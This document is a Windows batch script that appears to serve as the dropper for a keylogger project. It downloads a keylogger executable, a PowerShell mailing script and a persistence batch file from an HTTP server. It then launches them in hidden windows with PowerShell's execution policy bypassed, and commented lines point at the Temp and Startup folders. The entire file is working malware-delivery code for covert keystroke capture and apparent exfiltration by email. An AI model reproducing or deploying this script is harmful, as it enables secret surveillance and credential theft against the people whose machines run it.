REM Change to the temp directory
REM cd "%userprofile%\AppData\Local\Temp"

cd "D:\keylogger\Key_logger_v_1.2\hosting_test"

REM Replace the URL below with the actual URL of the keylogger on your server
set URL= http://192.168.48.1:80

REM Download three files
start powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%/logger.exe','logger.exe')"
start powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%/Record.txt','Record.txt')"
start powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%/ps_mail.ps1','ps_mail.ps1')"

timeout /t 2 /nobreak

REM start /MIN logger.exe
REM Start powershell -Command "(./ps_mail.ps1)"

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(./logger.exe)"

start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(./ps_mail.ps1)"

REM Change to the startup directory
REM cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

cd "D:\keylogger\Key_logger_v_1.2\hosting_test"

REM Download a batch file
start powershell -Command (New-Object System.Net.WebClient).DownloadFile('%URL%/persistent.bat', 'persistent.bat')
